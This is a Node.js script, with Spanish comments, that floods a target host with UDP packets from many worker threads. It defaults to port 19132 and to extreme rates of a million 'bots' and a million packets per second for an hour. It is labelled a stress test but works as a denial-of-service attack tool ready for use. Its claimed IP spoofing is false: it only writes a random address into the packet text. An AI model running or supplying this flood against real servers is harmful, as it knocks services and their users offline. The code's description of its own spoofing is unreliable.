const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const dgram = require('dgram');

if (isMainThread) {
    // Código principal
    const args = process.argv.slice(2);
    const serverAddress = args[0] || '127.0.0.1'; // IP del servidor
    const serverPort = parseInt(args[1], 10) || 19132; // Puerto del servidor
    const numBots = parseInt(args[2], 10) || 1000000; // Número de bots
    const pps = parseInt(args[3], 10) || 1000000; // Paquetes por segundo por bot
    const duration = parseInt(args[4], 10) || 3600; // Duración en segundos (1 hora)
    const numThreads = parseInt(args[5], 10) || 100; // Número de hilos

    for (let i = 0; i < numThreads; i++) {
        new Worker(__filename, {
            workerData: { serverAddress, serverPort, numBots, pps, duration }
        });
    }
} else {
    // Código del trabajador
    const { serverAddress, serverPort, numBots, pps, duration } = workerData;
    const client = dgram.createSocket('udp4');

    function getRandomIp() {
        return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    }

    function sendPacket(botId, packetId) {
        const spoofedIp = getRandomIp();
        const message = Buffer.from(`Bot ${botId} - Paquete de prueba ${packetId} desde ${spoofedIp}`);
        client.send(message, 0, message.length, serverPort, serverAddress, (err) => {
            if (err) {
                console.error(`Bot ${botId}: Error al enviar paquete ${packetId} - ${err.message}`);
            } else {
                console.log(`Bot ${botId}: Enviando paquete ${packetId} desde ${spoofedIp} a ${serverAddress}:${serverPort}`);
            }
        });
    }

    for (let botId = 0; botId < numBots; botId++) {
        let packetId = 0;
        const interval = setInterval(() => {
            sendPacket(botId, packetId++);
        }, 1000 / pps);

        setTimeout(() => {
            clearInterval(interval);
            if (botId === numBots - 1) {
                client.close();
                console.log("Prueba de estrés completada.");
            }
        }, duration * 1000);
    }
}
